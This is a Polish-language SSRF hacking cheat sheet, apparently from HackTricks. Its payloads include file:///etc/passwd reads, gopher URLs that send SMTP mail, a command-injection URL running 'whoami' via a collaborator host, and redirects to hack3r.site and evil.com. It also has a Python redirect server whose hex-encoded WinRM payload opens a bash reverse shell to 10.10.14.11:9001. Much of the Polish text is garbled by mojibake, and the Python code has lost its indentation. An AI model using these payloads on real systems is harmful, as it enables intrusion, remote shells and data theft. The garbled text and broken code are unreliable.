# SSRF (Server Side Request Forgery)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
U偶yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby atwo tworzy i **automatyzowa zadania** przy u偶yciu najbardziej zaawansowanych narzdzi spoecznociowych na wiecie.\
Otrzymaj dostp ju偶 dzi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi trikami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>


## Podstawowe informacje

Podatno na **Server-side Request Forgery (SSRF)** wystpuje, gdy atakujcy manipuluje **aplikacj po stronie serwera**, aby wykonywaa **偶dania HTTP** do wybranej przez niego domeny. Ta podatno nara偶a serwer na dowolne zewntrzne 偶dania kierowane przez atakujcego.

## Przechwytywanie SSRF

Pierwsz rzecz, jak musisz zrobi, jest przechwycenie interakcji SSRF wygenerowanej przez ciebie. Do przechwytywania interakcji HTTP lub DNS mo偶na u偶y narzdzi takich jak:

* **Burp Collaborator**
* [**pingb**](http://pingb.in)
* [**canarytokens**](https://canarytokens.org/generate)
* [**interractsh**](https://github.com/projectdiscovery/interactsh)
* [**http://webhook.site**](http://webhook.site)
* [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
* [http://requestrepo.com/](http://requestrepo.com/)
* [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
* [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - Burp Collaborator z wykorzystaniem ngrok

## Ominicie biaej listy domen

Zazwyczaj oka偶e si, 偶e SSRF dziaa tylko w **okrelonych domenach** lub adresach URL znajdujcych si na biaej licie. Na nastpnej stronie znajduje si **kompilacja technik, kt贸re mo偶na spr贸bowa, aby omin t bia list**:

{% content-ref url="url-format-bypass.md" %}
[url-format-bypass.md](url-format-bypass.md)
{% endcontent-ref %}

### Ominicie za pomoc przekierowania otwartego

Jeli serwer jest odpowiednio chroniony, mo偶na **omin wszystkie ograniczenia, wykorzystujc przekierowanie otwarte na stronie internetowej**. Poniewa偶 strona internetowa pozwoli na **SSRF do tej samej domeny** i prawdopodobnie bdzie **przekierowywa**, mo偶na wykorzysta **przekierowanie otwarte, aby sprawi, 偶e serwer uzyska dostp do dowolnego zasobu wewntrznego**.\
Czytaj wicej tutaj: [https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

## Protokoy

- **file://**
- Schemat URL `file://` jest odwoaniem do `/etc/passwd`: `file:///etc/passwd`

- **dict://**
- Schemat URL DICT jest opisany jako wykorzystywany do dostpu do definicji lub list s贸w za pomoc protokou DICT. Przykad ilustruje skonstruowany URL, kt贸ry celuje w okrelone sowo, baz danych i numer wpisu, a tak偶e potencjalne nadu偶ycie skryptu PHP do poczenia z serwerem DICT przy u偶yciu dostarczonych przez atakujcego powiadcze: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`

- **SFTP://**
- Zidentyfikowany jako protok贸 bezpiecznego transferu plik贸w przez bezpieczn powok, podano przykad, w kt贸rym skrypt PHP mo偶e by wykorzystany do poczenia z zoliwym serwerem SFTP: `url=sftp://generic.com:11111/`

- **TFTP://**
- Protok贸 Trivial File Transfer Protocol, dziaajcy w oparciu o UDP, jest wspomniany jako przykad skryptu PHP zaprojektowanego do wysyania 偶dania do serwera TFTP. Wysyane jest 偶danie TFTP do 'generic.com' na porcie '12346' dla pliku 'TESTUDPPACKET': `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`

- **LDAP://**
- Ten segment obejmuje protok贸 Lightweight Directory Access Protocol, podkrelajc jego wykorzystanie do zarzdzania i dostpu do rozproszonych usug informacyjnych katalog贸w w sieciach IP. Interakcja z serwerem LDAP na localhost: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`

- **SMTP**
- Opisana jest metoda wykorzystania podatnoci SSRF do interakcji z usugami SMTP na localhost, w tym kroki majce na celu ujawnienie wewntrznych nazw domenowych i dalsze dziaania dochodzeniowe oparte na tych informacjach.
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - omijanie WAF**
- Jeli SSRF jest wykonywane przez **curl**, curl posiada funkcj o nazwie [**URL globbing**](https://everything.curl.dev/cmdline/globbing), kt贸ra mo偶e by przydatna do omijania WAF贸w. Na przykad w tym [**wpisie**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi) znajdziesz przykad na **przechodzenie cie偶ek za pomoc protokou `file`**:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- Omawiana jest mo偶liwo protokou Gopher do okrelania adresu IP, portu i bajt贸w do komunikacji z serwerem, wraz z narzdziami takimi jak Gopherus i remote-method-guesser do tworzenia payload贸w. Przedstawione s dwa r贸偶ne zastosowania:

### Gopher://

Korzystajc z tego protokou, mo偶esz okreli **adres IP, port i bajty**, kt贸re chcesz, aby serwer **wysa**. Nastpnie mo偶esz wykorzysta SSRF, aby **komunikowa si z dowolnym serwerem TCP** (ale musisz wiedzie, jak rozmawia z usug).\
Na szczcie mo偶esz u偶y [Gopherus](https://github.com/tarunkant/Gopherus), aby tworzy payloady dla wielu usug. Dodatkowo, [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) mo偶na u偶y do tworzenia payload贸w _gopher_ dla usug _Java RMI_.

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**

Gopher HTTP is a technique used in Server-Side Request Forgery (SSRF) attacks. It involves exploiting the Gopher protocol to make HTTP requests from the vulnerable server to arbitrary destinations.

The Gopher protocol is a simple protocol used for retrieving and displaying documents over the Internet. It operates on port 70 and uses a hierarchical structure similar to URLs. By crafting a Gopher URL with an HTTP request as the payload, an attacker can trick the server into making unintended HTTP requests.

To perform a Gopher HTTP attack, follow these steps:

1. Identify a vulnerable parameter that accepts URLs as input.
2. Craft a Gopher URL with the desired HTTP request as the payload. The payload should be URL-encoded.
3. Submit the Gopher URL as the input to the vulnerable parameter.
4. The server will interpret the Gopher URL and make an HTTP request to the specified destination.
5. Analyze the response from the server to gather information or exploit vulnerabilities.

Gopher HTTP can be used to bypass network restrictions, access internal resources, or perform reconnaissance on the target system. It is important to note that not all servers support the Gopher protocol, so this technique may not be applicable in all cases.

To protect against Gopher HTTP attacks, it is recommended to validate and sanitize user input, especially when accepting URLs as input. Additionally, network filtering and access controls can be implemented to restrict outbound connections to trusted destinations.
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP - Poczenie zwrotne do 1337**

{% code title="redirect.php" %}
```php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
{% endcode %}


## SSRF za porednictwem nag贸wka Referrer i innych

Oprogramowanie analityczne na serwerach czsto rejestruje nag贸wek Referrer w celu ledzenia przychodzcych link贸w, praktyka ta nieumylnie nara偶a aplikacje na podatnoci na podrobienie 偶dania po stronie serwera (SSRF). Dzieje si tak, poniewa偶 takie oprogramowanie mo偶e odwiedza zewntrzne adresy URL wymienione w nag贸wku Referrer w celu analizy zawartoci strony odsyajcej. Aby odkry te podatnoci, zaleca si u偶ycie wtyczki Burp Suite "**Collaborator Everywhere**", wykorzystujcej spos贸b przetwarzania nag贸wka Referer przez narzdzia analityczne w celu identyfikacji potencjalnych powierzchni ataku SSRF.

## SSRF za porednictwem danych SNI z certyfikatu

Konfiguracja, kt贸ra umo偶liwia poczenie z dowolnym backendem za pomoc prostego ustawienia, jest ilustrowana na przykadzie konfiguracji Nginx:
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
W tej konfiguracji warto z pola Server Name Indication (SNI) jest bezporednio wykorzystywana jako adres backendu. Taka konfiguracja nara偶a na podatno na Server-Side Request Forgery (SSRF), kt贸ra mo偶e by wykorzystana poprzez podanie 偶danego adresu IP lub nazwy domeny w polu SNI. Poni偶ej przedstawiono przykad wykorzystania, aby wymusi poczenie z dowolnym backendem, takim jak `internal.host.com`, za pomoc polecenia `openssl`:
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## [Przesyanie plik贸w za pomoc Wget](../file-upload/#wget-file-upload-ssrf-trick)

## SSRF z wstrzykniciem komend

Warto spr贸bowa takiego payloadu: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## Renderowanie plik贸w PDF

Jeli strona internetowa automatycznie tworzy plik PDF na podstawie dostarczonych informacji, mo偶esz **wstrzykn pewien kod JavaScript, kt贸ry zostanie wykonany przez sam kreator PDF** (serwer) podczas tworzenia pliku PDF, co pozwoli na wykorzystanie SSRF. [**Znajd藕 wicej informacji tutaj**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## Od SSRF do DoS

Utw贸rz kilka sesji i spr贸buj pobra ci偶kie pliki, wykorzystujc SSRF z tych sesji.

## Funkcje PHP SSRF

{% content-ref url="../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md" %}
[php-ssrf.md](../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md)
{% endcontent-ref %}

## Przekierowanie SSRF do Gophera

W niekt贸rych przypadkach eksploatacji mo偶e by konieczne **wysanie odpowiedzi przekierowania** (ewentualnie do u偶ycia innego protokou, takiego jak gopher). Poni偶ej znajduj si r贸偶ne kody Pythona, kt贸re su偶 do odpowiedzi przekierowaniem:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)

self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
```python
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
U偶yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby atwo tworzy i **automatyzowa przepywy pracy** z wykorzystaniem najbardziej zaawansowanych narzdzi spoecznociowych na wiecie.\
Otrzymaj dostp ju偶 dzi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Bypassowanie CORS/SOP za pomoc DNS Rebidding

Jeli masz **problemy** z **wyciekiem treci z lokalnego IP** z powodu **CORS/SOP**, mo偶na u偶y **DNS Rebidding**, aby omin to ograniczenie:

{% content-ref url="../cors-bypass.md" %}
[cors-bypass.md](../cors-bypass.md)
{% endcontent-ref %}

### Automatyzacja DNS Rebidding

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) to narzdzie do przeprowadzania atak贸w [DNS rebinding](https://en.wikipedia.org/wiki/DNS\_rebinding). Zawiera niezbdne komponenty do ponownego powizania adresu IP serwera atakujcego z adresem IP docelowego komputera i dostarczania adunk贸w ataku w celu wykorzystania podatnego oprogramowania na docelowym komputerze.

Sprawd藕 r贸wnie偶 publicznie dziaajcy serwer na stronie [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

## DNS Rebidding + TLS Session ID/Session ticket

Wymagania:

* **SSRF**
* **Sesje TLS wychodzce**
* **Rzeczy na lokalnych portach**

Atak:

1. Popro u偶ytkownika/bota o **dostp** do **domeny** kontrolowanej przez **atakujcego**
2. **TTL** DNS wynosi **0** sekund (dziki temu ofiara wkr贸tce ponownie sprawdzi IP domeny)
3. Midzy ofiar a domen atakujcego tworzona jest **poczenie TLS**. Atakujcy wprowadza **adunek wewntrz** **Session ID lub Session Ticket**.
4. **Domena** rozpocznie **nieskoczon ptl** przekierowa na samego siebie. Celem tego jest zmuszenie u偶ytkownika/bota do dostpu do domeny, a偶 ponownie wykona **偶danie DNS** dla tej domeny.
5. W 偶daniu DNS podawany jest **adres IP prywatny** (np. 127.0.0.1)
6. U偶ytkownik/bot spr贸buje **ponownie nawiza poczenie TLS** i w tym celu wyle **ID sesji/ticketu** (w kt贸rym zawarty by **adunek** atakujcego). Gratulacje, udao ci si poprosi **u偶ytkownika/bota o atak na samego siebie**.

Nale偶y zauwa偶y, 偶e podczas tego ataku, jeli chcesz zaatakowa localhost:11211 (_memcache_), musisz sprawi, aby ofiara nawizaa pocztkowe poczenie z www.attacker.com:11211 (port musi by zawsze taki sam).\
Aby **wykona ten atak, mo偶esz u偶y narzdzia**: [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
Aby uzyska **wicej informacji**, zapoznaj si z prezentacj, w kt贸rej wyjaniono ten atak: [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab\_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo\&ab\_channel=DEFCONConference)

## Blind SSRF

R贸偶nica midzy blind SSRF a niewidocznym polega na tym, 偶e w przypadku blind nie mo偶na zobaczy odpowiedzi na 偶danie SSRF. W zwizku z tym jest trudniejszy do wykorzystania, poniewa偶 mo偶na wykorzysta tylko dobrze znane podatnoci.

### SSRF oparty na czasie

**Sprawdzajc czas** odpowiedzi serwera, mo偶na **ustali, czy zas贸b istnieje czy nie** (mo偶e zajmie wicej czasu dostp do istniejcego zasobu ni偶 dostp do nieistniejcego)

## Wykorzystanie SSRF w chmurze

Jeli znajdziesz podatno SSRF w maszynie dziaajcej w rodowisku chmurowym, mo偶esz uzyska interesujce informacje na temat rodowiska chmurowego, a nawet powiadczenia:

{% content-ref url="cloud-ssrf.md" %}
[cloud-ssrf.md](cloud-ssrf.md)
{% endcontent-ref %}

## Podatne platformy SSRF

Wiele znanych platform zawierao lub zawiera podatnoci SSRF, sprawd藕 je tutaj:

{% content-ref url="ssrf-vulnerable-platforms.md" %}
[ssrf-vulnerable-platforms.md](ssrf-vulnerable-platforms.md)
{% endcontent-ref %}

## Narzdzia

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

Narzdzie do wykrywania i wykorzystywania podatnoci SSRF

### [Gopherus](https://github.com/tarunkant/Gopherus)

* [Blog post na temat Gopherus](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

To narzdzie generuje adunki Gopher dla:

* MySQL
* PostgreSQL
* FastCGI
* Redis
* Zabbix
* Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

* [Blog post na temat u偶ycia SSRF](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ to skaner podatnoci _Java RMI_, kt贸ry obsuguje operacje atakujce dla wikszoci powszechnych podatnoci _Java RMI_. Wikszo dostpnych operacji obsuguje opcj `--ssrf`, aby wygenerowa adunek _SSRF_ dla 偶danej operacji. W poczeniu z opcj `--gopher` mo偶na bezporednio generowa gotowe adunki _gopher_.

### [SSRF Proxy](https://github.com/bcoles/ssrf\_proxy)

SSRF Proxy to wielowtkowy serwer proxy HTTP zaprojektowany do tunelowania ruchu HTTP klienta przez serwery HTTP podatne na Server-Side Request Forgery (SSRF).

### Do wicze

{% embed url="https://github.com/incredibleindishell/SSRF_Vulnerable_Lab" %}

## Odwoania

* [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
* [https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy
